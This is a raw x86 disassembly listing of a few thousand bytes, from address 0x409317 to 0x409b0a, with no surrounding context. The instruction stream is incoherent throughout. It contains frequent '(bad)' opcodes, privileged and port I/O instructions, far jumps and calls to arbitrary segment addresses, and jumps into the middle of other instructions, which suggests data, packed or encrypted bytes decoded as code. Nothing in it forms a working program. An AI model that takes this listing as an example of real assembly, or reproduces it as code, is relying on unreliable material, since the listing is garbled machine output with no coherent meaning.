  409317:	imul   esp,DWORD PTR [ebp+0x64],0xc5f27191
  40931e:	pop    ebx
  40931f:	xor    DWORD PTR [ecx+0x1],edi
  409322:	jno    0x409359
  409324:	pop    ecx
  409325:	not    DWORD PTR [ecx-0x422101f]
  40932b:	nop
  40932c:	dec    edx
  40932d:	mov    ds:0xe6749e80,al
  409332:	aaa    
  409333:	in     eax,dx
  409334:	add    edx,DWORD PTR [esp+ebp*2-0x40]
  409338:	xor    edx,DWORD PTR [ebp+edi*1-0x6]
  40933c:	adc    eax,0x4468cf85
  409341:	rcl    BYTE PTR [ecx-0x5259249e],cl
  409347:	jbe    0x40931d
  409349:	cdq    
  40934a:	lahf   
  40934b:	lds    ecx,FWORD PTR [edi-0x38]
  40934e:	in     al,0x9f
  409350:	mov    eax,0x7ee9168b
  409355:	jae    0x40937d
  409357:	rcl    esp,cl
  409359:	mov    dl,0x18
  40935b:	js     0x4092e5
  40935d:	repnz push 0xe93da2fa
  409363:	(bad)  
  409365:	mov    cl,0xbb
  409367:	jno    0x409321
  409369:	pop    ss
  40936a:	stos   DWORD PTR es:[edi],eax
  40936b:	push   esp
  40936c:	addr16 icebp 
  40936e:	dec    ebx
  40936f:	dec    esi
  409370:	sbb    bl,ah
  409372:	xor    BYTE PTR [ebx-0x6],0x1f
  409376:	je     0x40936e
  409378:	dec    eax
  409379:	ja     0x4092ff
  40937b:	xchg   esi,eax
  40937c:	(bad)  
  40937e:	and    eax,0x50dad5b1
  409383:	jnp    0x40932b
  409385:	pop    edi
  409386:	and    bh,dl
  409388:	mov    cl,0x8
  40938a:	ss xchg ebx,eax
  40938c:	add    esi,eax
  40938e:	xchg   DWORD PTR [edi-0xf],ebp
  409391:	add    al,0x8c
  409393:	push   ds
  409394:	sbb    al,0x88
  409396:	dec    edx
  409397:	aad    0xb2
  409399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40939a:	pop    esp
  40939b:	xor    dl,cl
  40939d:	popa   
  40939e:	cmp    BYTE PTR [esi-0x38b00dda],dh
  4093a4:	aam    0xe0
  4093a6:	xchg   esp,eax
  4093a7:	fisttp DWORD PTR [ecx+0x21]
  4093aa:	xor    DWORD PTR [ebp-0x3d],0xb99e1431
  4093b1:	sahf   
  4093b2:	sbb    ch,bl
  4093b4:	and    DWORD PTR [edi+esi*1-0x68cf4e1e],eax
  4093bb:	push   esp
  4093bc:	mov    eax,0x993fc994
  4093c1:	es inc esi
  4093c3:	mov    esp,0xfb9210
  4093c8:	imul   eax,DWORD PTR [ebx+0xe26ea47],0x387df47e
  4093d2:	xor    cl,BYTE PTR [edx]
  4093d4:	and    DWORD PTR [ecx-0x75],ecx
  4093d7:	mov    eax,0x8b4903ff
  4093dc:	imul   DWORD PTR [esi+eax*8]
  4093df:	jbe    0x4093d9
  4093e1:	mov    ecx,0x28ba7036
  4093e6:	jp     0x409451
  4093e8:	mov    ecx,0xa8433170
  4093ed:	add    al,BYTE PTR [edi+0x4b]
  4093f0:	jp     0x409395
  4093f2:	dec    ecx
  4093f3:	mov    dh,BYTE PTR [ebx]
  4093f5:	xchg   ebp,eax
  4093f6:	outs   dx,BYTE PTR ds:[esi]
  4093f7:	or     BYTE PTR [ebp+0x7caa4e5e],bl
  4093fd:	cmp    BYTE PTR [esi+0x420a9a2f],0xab
  409404:	ins    DWORD PTR es:[edi],dx
  409405:	push   ebp
  409406:	inc    eax
  409407:	popf   
  409408:	sub    edi,ecx
  40940a:	xchg   ebx,eax
  40940b:	stos   BYTE PTR es:[edi],al
  40940c:	aad    0x22
  40940e:	mov    ecx,0x93cbb94f
  409413:	mov    ecx,0x5300df6a
  409418:	adc    eax,0x2d361b51
  40941d:	xor    BYTE PTR ds:0x574819ec,cl
  409423:	in     al,0xb9
  409425:	and    esi,DWORD PTR [eax]
  409427:	pop    es
  409428:	mov    esp,DWORD PTR gs:[ebx+0x7b]
  40942c:	push   edx
  40942d:	test   al,0x41
  40942f:	push   ss
  409430:	repnz sbb BYTE PTR [eax+0x6e],al
  409434:	sets   ah
  409437:	xchg   esp,eax
  409438:	test   DWORD PTR [eax+0x63],esp
  40943b:	sahf   
  40943c:	(bad)  
  40943e:	pop    ebp
  40943f:	mov    edx,0xb359107d
  409444:	rol    al,0x82
  409447:	into   
  409448:	js     0x4093cc
  40944a:	push   esi
  40944b:	add    dh,BYTE PTR [edx]
  40944d:	in     al,0x2
  40944f:	dec    esi
  409450:	inc    ebx
  409451:	aad    0x4
  409453:	adc    eax,0x6e7a53c5
  409458:	push   ds
  409459:	call   0x2169:0x41465530
  409460:	sbb    bh,BYTE PTR [edi-0x46]
  409463:	jmp    DWORD PTR [ebp-0xe]
  409466:	mov    ch,BYTE PTR [esi-0x1f]
  409469:	sbb    DWORD PTR [ebx],ecx
  40946b:	aad    0x8e
  40946d:	sub    al,0x59
  40946f:	cmp    ebx,DWORD PTR [edi-0x36]
  409472:	popf   
  409473:	pop    eax
  409474:	cdq    
  409475:	xor    eax,edi
  409477:	push   cs
  409478:	cs mov esp,0x12d01acb
  40947e:	jmp    0x440e:0xf5571873
  409485:	sub    eax,0x34cb8d2
  40948a:	pop    ebp
  40948b:	adc    esp,DWORD PTR ds:0x58d1b07f
  409491:	jle    0x40943e
  409493:	jnp    0x4094f7
  409495:	xchg   BYTE PTR [edi+0x18029d30],al
  40949b:	stc    
  40949c:	mov    DWORD PTR [ecx+0x18],ecx
  40949f:	cmp    bh,BYTE PTR [ebx-0x1f]
  4094a2:	mov    eax,0xd74e2aff
  4094a7:	add    eax,0xcf78e72
  4094ac:	xchg   edi,eax
  4094ad:	jmp    0xe61f5a50
  4094b2:	jmp    0x9da0:0xa9bd53d6
  4094b9:	or     al,0x84
  4094bb:	mov    ch,0x13
  4094bd:	sub    ebp,esp
  4094bf:	scas   al,BYTE PTR es:[di]
  4094c1:	sub    eax,0x57d7b289
  4094c6:	or     BYTE PTR [ebp-0x716ed097],cl
  4094cc:	add    eax,0xcdb89cbc
  4094d1:	mov    bl,0x18
  4094d3:	imul   edi,DWORD PTR [edi-0x2205d3d7],0xfffffff7
  4094da:	cmp    al,0x9f
  4094dc:	xor    eax,0x462be640
  4094e1:	rdmsr  
  4094e3:	js     0x40954b
  4094e5:	cmp    BYTE PTR [ebp+0x2f],bl
  4094e8:	mov    BYTE PTR [ebp-0x7f3fbd99],dh
  4094ee:	push   ss
  4094ef:	add    ecx,DWORD PTR [esi-0x5b]
  4094f2:	mov    edx,0xd4f976a8
  4094f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094f8:	rcr    BYTE PTR ds:0xf4c325c6,cl
  4094fe:	adc    edi,ecx
  409500:	mov    ch,dl
  409502:	cwde   
  409503:	cmc    
  409504:	xchg   edi,eax
  409505:	jge    0x40951a
  409507:	and    al,0x24
  409509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40950a:	inc    ebx
  40950b:	jp     0x40955f
  40950d:	or     al,0x95
  40950f:	mov    gs,edx
  409511:	cmp    al,0x28
  409514:	(bad)  
  409515:	lea    esp,[ebx+edi*8]
  409518:	nop
  409519:	inc    esi
  40951a:	mov    ds:0x3b5b21d1,al
  40951f:	sub    BYTE PTR [ebx-0x6714fb8c],cl
  409525:	outs   dx,BYTE PTR ds:[esi]
  409526:	cmp    al,0x9d
  409528:	cmp    al,0xb7
  40952b:	fstp   TBYTE PTR [edx-0x50]
  40952e:	in     al,0x6b
  409530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409531:	rcr    BYTE PTR [edi-0x63],cl
  409534:	inc    esi
  409535:	loope  0x4095b6
  409537:	rcr    DWORD PTR [esi+0x1b],0x22
  40953b:	xor    eax,0xb071f6bb
  409540:	pop    esi
  409541:	add    DWORD PTR [esi-0x5275a2b],edx
  409547:	out    0xc1,al
  409549:	or     al,dh
  40954b:	mov    ds:0xc1fbeb31,eax
  409550:	int    0xb3
  409552:	lock out dx,al
  409554:	adc    DWORD PTR [ecx+esi*8+0x6],esp
  409558:	dec    edx
  409559:	pop    ss
  40955a:	in     al,dx
  40955b:	add    eax,0x20995b49
  409560:	sub    DWORD PTR [ebp+0x6b78e408],edx
  409566:	mov    al,ds:0x179ec834
  40956b:	lds    ecx,FWORD PTR [esi-0x63]
  40956e:	int    0xa
  409570:	in     al,dx
  409571:	jb     0x4094f6
  409573:	inc    edx
  409574:	adc    al,0xb7
  409576:	(bad)  
  409578:	aad    0xac
  40957a:	and    eax,DWORD PTR [ecx+0x38ff9977]
  409580:	fadd   DWORD PTR [ecx+eiz*8+0x61]
  409584:	xchg   esi,eax
  409585:	int    0x33
  409587:	bound  edx,QWORD PTR ds:0xa4427924
  40958d:	adc    eax,0xbedebc1e
  409592:	or     cl,BYTE PTR [esi+0x7cb89f77]
  409598:	dec    ebp
  409599:	clc    
  40959a:	je     0x4095aa
  40959c:	stos   BYTE PTR es:[edi],al
  40959d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40959e:	push   es
  40959f:	jmp    0xd64b:0x7403a11d
  4095a6:	call   0xb2ce:0x6e025a45
  4095ad:	xor    DWORD PTR [ebx+edi*4+0x381ecb20],ebx
  4095b4:	retf   0x949f
  4095b7:	mov    bh,dl
  4095b9:	push   es
  4095ba:	cmp    dl,BYTE PTR [esi-0x41]
  4095bd:	mov    edx,0x8722ce25
  4095c2:	cdq    
  4095c3:	popa   
  4095c4:	jmp    0x1e7:0xceb2801c
  4095cb:	jbe    0x409614
  4095cd:	dec    esp
  4095ce:	inc    edx
  4095cf:	cdq    
  4095d0:	mov    cl,0xa2
  4095d2:	call   0xaa219ad1
  4095d7:	cmp    BYTE PTR [eax-0x77],0xf
  4095db:	int3   
  4095dc:	adc    ah,ah
  4095de:	bound  ebx,QWORD PTR [edi+0x55569845]
  4095e4:	jo     0x4095f2
  4095e6:	outs   dx,DWORD PTR ds:[esi]
  4095e7:	sbb    esi,DWORD PTR [edi+0x4f522a27]
  4095ed:	cwde   
  4095ee:	fst    QWORD PTR [ecx+ecx*1+0xe]
  4095f2:	mov    dh,0x6b
  4095f4:	pop    ebp
  4095f5:	mov    edi,DWORD PTR [ecx]
  4095f7:	and    ah,BYTE PTR [ebp-0x2febf884]
  4095fd:	aad    0x6f
  4095ff:	inc    ebp
  409600:	aad    0xed
  409602:	mov    dl,0x61
  409604:	xlat   BYTE PTR ds:[ebx]
  409605:	adc    eax,DWORD PTR [eax+0x43]
  409608:	mov    BYTE PTR [edx],ah
  40960a:	adc    eax,0x84efa35b
  40960f:	sar    ebx,cl
  409611:	(bad)  
  409612:	(bad)  
  409613:	(bad)  
  409614:	daa    
  409615:	(bad)  
  409616:	fst    QWORD PTR ds:0xf58d5198
  40961c:	pop    ebp
  40961d:	pop    ebx
  40961e:	and    BYTE PTR [ebp+0x80f4c3e],dh
  409624:	push   esi
  409625:	inc    esp
  409626:	push   es
  409627:	inc    ebp
  409628:	arpl   WORD PTR [ecx+0x178524e9],bx
  40962e:	xor    cl,bh
  409630:	retf   0x6416
  409633:	call   0x2d2f:0xfd4f925f
  40963a:	mov    cl,0x39
  40963c:	xor    DWORD PTR ds:0x85108101,edx
  409642:	adc    eax,DWORD PTR [ecx+0x19]
  409645:	sbb    eax,0x7bc40655
  40964a:	sbb    al,BYTE PTR [edx-0x20]
  40964d:	cmc    
  40964e:	inc    edx
  40964f:	mov    ecx,0x5ff2298a
  409654:	loop   0x4096ad
  409656:	inc    ecx
  409657:	lock add eax,0x6fc2fed4
  40965d:	fistp  QWORD PTR [ecx-0x60]
  409660:	mov    fs,WORD PTR [edx+ecx*8-0x3be3d1d]
  409667:	adc    eax,0x8d4d2947
  40966c:	mov    edi,0x2b2575ba
  409671:	push   ebp
  409672:	or     al,0x8d
  409674:	or     ah,BYTE PTR [ecx-0x35d0b2a7]
  40967a:	imul   edi,ebp,0x7df1093a
  409680:	adc    DWORD PTR [edx+0x1126a8b],edi
  409686:	and    DWORD PTR [edx+0x3c],edx
  409689:	sbb    cl,cl
  40968b:	inc    esp
  40968c:	sbb    al,0x66
  40968e:	sti    
  40968f:	inc    esp
  409690:	push   edi
  409691:	sub    esp,DWORD PTR ds:0x9b0247dc
  409697:	jbe    0x409646
  409699:	add    al,0xa4
  40969b:	js     0x4096c3
  40969d:	push   ss
  40969e:	push   eax
  40969f:	sti    
  4096a0:	cmp    cl,BYTE PTR [edx+0x3a]
  4096a3:	(bad)  
  4096a4:	mov    al,0xa1
  4096a6:	int    0x89
  4096a8:	test   BYTE PTR [ebp+0x7c],0x2e
  4096ac:	pop    ebx
  4096ad:	push   edi
  4096ae:	dec    ecx
  4096af:	sub    ecx,DWORD PTR [ecx]
  4096b1:	(bad)  
  4096b2:	xor    al,0x12
  4096b4:	push   esp
  4096b5:	mov    edi,DWORD PTR [esi+0x21db553e]
  4096bb:	mov    DWORD PTR [ecx],ebx
  4096bd:	sbb    eax,0x6569fbac
  4096c2:	popf   
  4096c3:	xchg   ebp,eax
  4096c4:	add    BYTE PTR [eax],bh
  4096c6:	xor    DWORD PTR [eax],edi
  4096c8:	bound  esp,QWORD PTR [edi-0x676aa350]
  4096ce:	(bad)  
  4096cf:	xchg   ebx,eax
  4096d0:	sub    DWORD PTR [ebp+0x35a8ad19],esi
  4096d6:	mov    DWORD PTR [edi-0x8],0x72fc9d86
  4096dd:	je     0x409695
  4096df:	pop    es
  4096e0:	inc    esp
  4096e1:	inc    edi
  4096e2:	(bad)  
  4096e4:	out    dx,al
  4096e5:	sbb    dl,dl
  4096e7:	add    eax,0x47e27c13
  4096ec:	dec    eax
  4096ed:	inc    ebp
  4096ee:	jg     0x409676
  4096f0:	lods   al,BYTE PTR ds:[esi]
  4096f1:	iret   
  4096f2:	in     al,dx
  4096f3:	and    BYTE PTR [ebp+0x5cb85eb1],bl
  4096f9:	inc    esi
  4096fa:	xor    DWORD PTR [edx+0xf],ecx
  4096fd:	shl    DWORD PTR [edi],cl
  4096ff:	into   
  409700:	cld    
  409701:	int3   
  409702:	fisub  DWORD PTR [esi]
  409704:	jmp    0x4096e5
  409706:	mov    al,ds:0x33e83829
  40970b:	test   esp,esp
  40970d:	pushf  
  40970e:	aas    
  40970f:	into   
  409710:	test   BYTE PTR [eax],ch
  409712:	xor    BYTE PTR [ebx+eiz*2],ah
  409715:	sbb    ebx,DWORD PTR [esi]
  409717:	push   ds
  409718:	dec    edx
  409719:	xchg   ebp,eax
  40971a:	pop    ebx
  40971b:	js     0x409735
  40971d:	fsubr  QWORD PTR [eax+0x32]
  409720:	lods   eax,DWORD PTR ds:[esi]
  409721:	and    al,0x15
  409723:	xchg   esp,eax
  409724:	push   ebp
  409725:	jae    0x409774
  409727:	mov    DWORD PTR [esi+0x3f],esp
  40972a:	push   ss
  40972b:	out    dx,eax
  40972c:	mov    WORD PTR [ebx],?
  40972e:	aaa    
  40972f:	xlat   BYTE PTR ds:[ebx]
  409730:	or     eax,DWORD PTR [edx]
  409732:	out    0x4d,al
  409734:	(bad)  
  409736:	call   0xe23362ca
  40973b:	out    0xc3,al
  40973d:	adc    BYTE PTR [ecx],cl
  40973f:	add    edi,DWORD PTR [edi-0x22]
  409742:	mov    ss,WORD PTR [ebx]
  409744:	push   edi
  409745:	shr    BYTE PTR [esp+esi*1],0xbf
  409749:	aam    0xf5
  40974b:	xchg   ebx,eax
  40974c:	push   ecx
  40974d:	pushf  
  40974e:	(bad)  
  40974f:	sbb    al,0x0
  409751:	imul   ebx,DWORD PTR [edx],0x30
  409754:	jmp    0x4097cb
  409756:	jg     0x4097c7
  409758:	dec    esi
  409759:	in     eax,0x1f
  40975b:	sbb    dl,BYTE PTR [ebx+ebp*4+0x1]
  40975f:	push   cs
  409760:	cld    
  409761:	cmp    eax,0x47c1160f
  409766:	(bad)  ds:0xebf5c3f0
  40976d:	lahf   
  40976e:	jnp    0x4097d4
  409770:	daa    
  409771:	(bad)  
  409772:	addr16 jge 0x4097bf
  409775:	xchg   edi,eax
  409776:	dec    ebp
  409777:	ds push 0xfffffff3
  40977a:	cmp    ebx,edi
  40977c:	test   al,0x15
  40977e:	inc    ecx
  40977f:	(bad)  
  409780:	ss jmp 0x40974a
  409783:	push   ebp
  409784:	retf   0x8bc7
  409787:	mov    esp,0x3c0a9c2
  40978c:	pop    ds
  40978d:	cmp    BYTE PTR [edi+0x5f5f1257],bh
  409793:	mov    edx,0xc989aa11
  409798:	cmp    al,0x5b
  40979a:	push   es
  40979b:	or     BYTE PTR [eax],ah
  40979d:	jo     0x4097a6
  40979f:	int    0x51
  4097a1:	jp     0x4097ac
  4097a3:	dec    ecx
  4097a4:	mov    al,ds:0xe45dc554
  4097a9:	xchg   edi,eax
  4097aa:	outs   dx,DWORD PTR ds:[esi]
  4097ab:	pushf  
  4097ac:	sar    DWORD PTR [edi],cl
  4097ae:	cmp    DWORD PTR [edx],ebx
  4097b0:	rcl    DWORD PTR [ecx+0x61bc5351],1
  4097b6:	in     eax,0x73
  4097b8:	test   DWORD PTR [eax],ecx
  4097ba:	jecxz  0x409798
  4097bc:	retf   0x2b21
  4097bf:	cli    
  4097c0:	fldenv [edx+0x41]
  4097c3:	push   ecx
  4097c4:	cmp    bh,BYTE PTR [esi]
  4097c6:	dec    edx
  4097c7:	push   ds
  4097c8:	std    
  4097c9:	lods   eax,DWORD PTR ds:[esi]
  4097ca:	or     edi,ecx
  4097cc:	add    DWORD PTR [esi+0x722c98a5],esp
  4097d2:	push   edx
  4097d3:	stos   DWORD PTR es:[edi],eax
  4097d4:	dec    ebx
  4097d5:	(bad)  
  4097d6:	leave  
  4097d7:	push   esp
  4097d8:	lahf   
  4097d9:	sub    al,0xdd
  4097db:	xor    eax,esp
  4097dd:	clc    
  4097de:	xor    ch,BYTE PTR [edi]
  4097e0:	not    BYTE PTR [ecx+edx*2-0x1f]
  4097e4:	or     BYTE PTR ds:[edi],dh
  4097e7:	(bad)  
  4097e8:	adc    bh,BYTE PTR [esi]
  4097ea:	xor    al,0xf0
  4097ec:	cmp    eax,0xb2842f45
  4097f1:	mov    esi,0xc7f2b743
  4097f6:	fstp   DWORD PTR [ebx-0x1c]
  4097f9:	or     al,0x35
  4097fb:	add    al,0x6e
  4097fd:	jg     0x4097fd
  4097ff:	jmp    0x50e6d28b
  409804:	test   eax,0x26d156f2
  409809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40980a:	add    BYTE PTR [ecx-0x5f],ch
  40980d:	mov    eax,DWORD PTR [edx]
  40980f:	mov    ecx,0x1d81921a
  409814:	xchg   ebx,eax
  409815:	pop    es
  409816:	(bad)  
  409817:	push   ecx
  409818:	jb     0x409849
  40981a:	inc    eax
  40981b:	icebp  
  40981c:	mov    esi,0x301e46cf
  409821:	adc    al,0x20
  409823:	mov    al,BYTE PTR [edi]
  409825:	xlat   BYTE PTR ds:[ebx]
  409826:	inc    edx
  409827:	in     eax,dx
  409828:	cmp    bl,bh
  40982a:	mov    ebx,0x1980ede2
  40982f:	mov    dl,0xb8
  409831:	push   ebp
  409832:	retf   
  409833:	add    DWORD PTR [ecx-0x1087cc9f],edx
  409839:	pop    ds
  40983a:	(bad)  
  40983b:	and    ecx,DWORD PTR [esi+0x2b]
  40983e:	mov    cl,BYTE PTR [edx+ebp*2]
  409841:	xor    esp,DWORD PTR [ebp-0x54b247d5]
  409847:	std    
  409848:	sbb    al,ch
  40984a:	daa    
  40984b:	inc    ebx
  40984c:	jnp    0x4098cd
  40984e:	lock adc al,0x89
  409851:	xor    al,0x78
  409853:	(bad)  
  409854:	daa    
  409855:	lea    esi,[ebx-0x427fe9ad]
  40985b:	inc    ebx
  40985c:	xchg   esp,eax
  40985d:	xchg   ebp,eax
  40985e:	xor    edi,esi
  409860:	and    ah,bl
  409862:	xor    bh,BYTE PTR [esp+eax*8-0x62c1ded5]
  409869:	mov    bl,0xed
  40986b:	pop    edi
  40986c:	ins    BYTE PTR es:[edi],dx
  40986d:	mov    esi,0x9b49e730
  409872:	and    ecx,DWORD PTR [eax]
  409874:	push   ebp
  409875:	(bad)  
  409877:	xchg   DWORD PTR [ecx],esp
  409879:	sbb    al,BYTE PTR [ebp-0x26417b03]
  40987f:	fld    DWORD PTR [ebx]
  409881:	aaa    
  409882:	inc    eax
  409883:	neg    bl
  409885:	or     al,0x99
  409887:	inc    esp
  409888:	scas   eax,DWORD PTR es:[edi]
  409889:	dec    DWORD PTR es:[edx+0x6e449f86]
  409890:	imul   BYTE PTR [esi+0x58]
  409893:	sub    al,BYTE PTR [eax-0x29b7c2b0]
  409899:	pop    edi
  40989a:	pop    ecx
  40989b:	ret    0x82ba
  40989e:	and    ah,bl
  4098a0:	scas   eax,DWORD PTR es:[edi]
  4098a1:	jbe    0x40991c
  4098a3:	or     eax,0xa1e01e7
  4098a8:	or     dl,BYTE PTR [esi-0x587e032f]
  4098ae:	stc    
  4098af:	int3   
  4098b0:	mov    esp,0x6747dc99
  4098b5:	pushf  
  4098b6:	sub    BYTE PTR [edi-0x312fff50],bl
  4098bc:	lea    esp,[eax-0x74]
  4098bf:	fdiv   QWORD PTR [ecx+0x72]
  4098c2:	ret    0xba40
  4098c5:	aaa    
  4098c6:	cmp    edi,ecx
  4098c8:	std    
  4098c9:	pop    eax
  4098ca:	xor    dh,BYTE PTR [ebp+ebx*4+0x4a]
  4098ce:	fcom   st(2)
  4098d0:	jb     0x4098bc
  4098d2:	cli    
  4098d3:	mov    edi,0xa2c6d0d8
  4098d8:	dec    ecx
  4098d9:	sub    eax,0xf1c4e4eb
  4098df:	and    DWORD PTR [edi+0x5e],edx
  4098e2:	je     0x4098b6
  4098e4:	ja     0x409926
  4098e6:	mov    ah,0x99
  4098e8:	mov    ch,bh
  4098ea:	sbb    al,0x17
  4098ec:	(bad)  [ecx]
  4098ee:	test   al,0x8e
  4098f0:	fadd   DWORD PTR [esi]
  4098f2:	mov    edx,0xc6ca958e
  4098f7:	push   ebp
  4098f9:	mov    bh,0x93
  4098fb:	cdq    
  4098fc:	scas   eax,DWORD PTR es:[edi]
  4098fd:	and    bl,BYTE PTR [edi]
  4098ff:	mov    al,0x2
  409901:	push   0x945b8d43
  409906:	dec    ebx
  409907:	or     BYTE PTR [ebp+0x36a1785e],0x3f
  40990e:	push   es
  40990f:	retf   
  409910:	lock mov ?,ebp
  409913:	loop   0x4098e0
  409915:	xor    eax,0x1c1f3655
  40991a:	xchg   edx,eax
  40991b:	fnstenv [esi+0x59]
  40991e:	call   0x3f1c42db
  409923:	xchg   ebp,eax
  409924:	dec    eax
  409925:	je     0x40998b
  409927:	mov    ds:0x8ab1f644,eax
  40992c:	cdq    
  40992d:	and    DWORD PTR [edx],edx
  40992f:	add    DWORD PTR [esp+ebp*2+0x23d1c9c3],edx
  409936:	and    BYTE PTR [eax+0x60f11ea2],bl
  40993c:	adc    al,0x41
  40993e:	arpl   WORD PTR [edx],bx
  409940:	or     DWORD PTR [ebx+0x9],eax
  409943:	adc    ebx,DWORD PTR [ebx-0x63]
  409946:	mov    edi,0xdbf874cb
  40994b:	jl     0x4099a5
  40994d:	dec    esi
  40994e:	leave  
  40994f:	pop    es
  409950:	ret    
  409951:	dec    ecx
  409952:	push   ss
  409953:	sar    ch,1
  409955:	adc    ecx,ebx
  409957:	adc    edx,ebp
  409959:	dec    ebx
  40995a:	call   0x12e525e8
  40995f:	xchg   esi,eax
  409960:	sbb    ecx,DWORD PTR [ebx]
  409962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409963:	sub    BYTE PTR [edx],dh
  409965:	loop   0x4098f7
  409967:	popf   
  409968:	loope  0x409966
  40996a:	iret   
  40996b:	out    dx,al
  40996c:	into   
  40996d:	(bad)  
  40996e:	mov    ebp,0x6f16d182
  409973:	js     0x4098ff
  409975:	stos   DWORD PTR es:[edi],eax
  409976:	xor    BYTE PTR [ecx],cl
  409978:	xlat   BYTE PTR ds:[ebx]
  409979:	cs adc al,0xaf
  40997c:	xchg   DWORD PTR [eax-0x9],esi
  40997f:	fcomp  DWORD PTR [edi-0x591670be]
  409985:	(bad)  
  409986:	cs mov ch,0xe9
  409989:	sar    edx,cl
  40998b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40998c:	jmp    0xac3e:0x6b81415d
  409993:	xlat   BYTE PTR ds:[ebx]
  409994:	xchg   DWORD PTR [ecx+0x2d],esi
  409997:	add    ah,BYTE PTR [ebp+0x54]
  40999a:	stos   DWORD PTR es:[edi],eax
  40999b:	dec    esi
  40999c:	push   0x55
  40999e:	xor    DWORD PTR [edi-0x1f7a07a1],ebp
  4099a4:	mov    ah,0x34
  4099a6:	test   edi,ebx
  4099a8:	(bad)  [ebx-0x4d28c647]
  4099ae:	dec    edx
  4099af:	out    dx,eax
  4099b0:	aad    0x2d
  4099b2:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099b4:	cmp    ecx,eax
  4099b6:	cmp    esp,DWORD PTR [edx+0x0]
  4099b9:	or     BYTE PTR [esi+ebx*2],bh
  4099bc:	push   ebx
  4099bd:	ss jmp 0x8293:0xc115c81c
  4099c5:	sub    edi,ecx
  4099c7:	lods   ax,WORD PTR ds:[esi]
  4099c9:	pop    esi
  4099ca:	mov    WORD PTR [ecx],fs
  4099cc:	das    
  4099cd:	clc    
  4099ce:	pop    edi
  4099cf:	jno    0x4099ed
  4099d1:	sub    al,0xb
  4099d3:	in     eax,0xd9
  4099d5:	stos   DWORD PTR es:[edi],eax
  4099d6:	addr16 add eax,0xd44b1668
  4099dc:	jno    0x4099d1
  4099de:	push   cs
  4099df:	sub    esp,DWORD PTR [edx]
  4099e1:	icebp  
  4099e2:	icebp  
  4099e3:	adc    BYTE PTR [edx+0x2531a76d],cl
  4099e9:	outs   dx,BYTE PTR ds:[esi]
  4099ea:	(bad)  
  4099eb:	retf   
  4099ec:	js     0x409999
  4099ee:	jb     0x409a6b
  4099f0:	jns    0x4099e0
  4099f2:	lock adc DWORD PTR [eax+edi*1-0x339efe6c],eax
  4099fa:	les    eax,FWORD PTR [edi-0x2a]
  4099fd:	sub    dl,BYTE PTR gs:[edx+0x3a]
  409a01:	add    al,0xd1
  409a03:	imul   ecx,DWORD PTR [esi],0xdadde938
  409a09:	jp     0x409a1f
  409a0b:	sub    DWORD PTR [edx+0x9],edi
  409a0e:	cmp    eax,0xd7395e55
  409a13:	mov    bl,0xac
  409a15:	fcomi  st,st(7)
  409a17:	(bad)  
  409a18:	jp     0x409a6e
  409a1a:	xor    al,0xdc
  409a1c:	ret    0xa0f0
  409a1f:	je     0x409a8e
  409a21:	push   ebp
  409a22:	xor    eax,0xe524727b
  409a27:	bound  esp,QWORD PTR [eax+0x253e98f0]
  409a2d:	push   DWORD PTR [edi+edx*1+0x24f4608a]
  409a34:	iret   
  409a35:	adc    dh,BYTE PTR ds:0x3fd5aaa8
  409a3b:	push   edi
  409a3c:	dec    esi
  409a3d:	sub    DWORD PTR [ebx+0x597db1a1],ebx
  409a43:	xor    dl,BYTE PTR [esi+edi*8+0x0]
  409a47:	inc    ebx
  409a48:	popa   
  409a49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a4a:	sub    edx,edx
  409a4c:	enter  0x599f,0xbe
  409a50:	push   edx
  409a52:	or     DWORD PTR [ecx-0x449b828a],ebp
  409a58:	push   ss
  409a59:	fcmove st,st(7)
  409a5b:	popf   
  409a5c:	retf   
  409a5d:	add    BYTE PTR [edx],ch
  409a5f:	and    al,0xb
  409a61:	repnz dec ebp
  409a63:	lea    ebx,[ebx]
  409a65:	hlt    
  409a66:	mov    ds:0x20a7b776,al
  409a6b:	jecxz  0x409a57
  409a6d:	or     esp,DWORD PTR [edi]
  409a6f:	xor    cl,bh
  409a71:	jmp    0xbb09:0xa94b8514
  409a78:	mov    esi,0x7e208ddb
  409a7d:	sbb    edx,ebx
  409a7f:	mov    ebp,0xc449b222
  409a84:	pop    eax
  409a85:	(bad)  
  409a86:	out    dx,eax
  409a87:	popf   
  409a88:	xchg   DWORD PTR [edi*2+0x17075aff],eax
  409a8f:	lods   al,BYTE PTR ds:[esi]
  409a90:	jae    0x409adb
  409a92:	sahf   
  409a93:	push   ss
  409a94:	outs   dx,DWORD PTR ds:[esi]
  409a95:	repnz inc edi
  409a97:	sbb    edx,eax
  409a99:	arpl   WORD PTR [edi+0x6cde0894],cx
  409a9f:	mov    dh,0x89
  409aa1:	bound  esp,QWORD PTR [esi]
  409aa3:	mov    ebp,0x27063352
  409aa8:	in     eax,0x6b
  409aaa:	xor    eax,0x109c6da1
  409aaf:	push   esp
  409ab0:	cmp    DWORD PTR [esi+0x17],esp
  409ab3:	test   cl,al
  409ab5:	repnz mov DWORD PTR ds:0x4bfd49ca,0x7ec80e0e
  409ac0:	repz add eax,0xc7c041e8
  409ac6:	sub    DWORD PTR ds:[ebp+ebp*8-0x5aae1498],0x44c4976b
  409ad2:	pop    eax
  409ad3:	call   0xd99a:0x7087363b
  409ada:	outs   dx,BYTE PTR ds:[esi]
  409adb:	inc    edx
  409adc:	pop    edi
  409add:	dec    eax
  409ade:	push   edi
  409adf:	(bad)  
  409ae0:	xchg   ecx,eax
  409ae1:	sbb    DWORD PTR [eax],edx
  409ae3:	aad    0xa0
  409ae5:	mov    ah,BYTE PTR [edx+0x67f82255]
  409aeb:	fucomi st,st(0)
  409aed:	call   0xa0a7c8e3
  409af2:	dec    eax
  409af3:	leave  
  409af4:	or     DWORD PTR [esi],esi
  409af6:	stos   DWORD PTR es:[edi],eax
  409af7:	and    dl,cl
  409af9:	add    esp,DWORD PTR [esi+0x867bcc3]
  409aff:	test   al,0x21
  409b01:	int    0x60
  409b03:	jmp    0x67d3:0xc421d243
  409b0a:	test   DWORD PTR [ebx+0x4b],edi
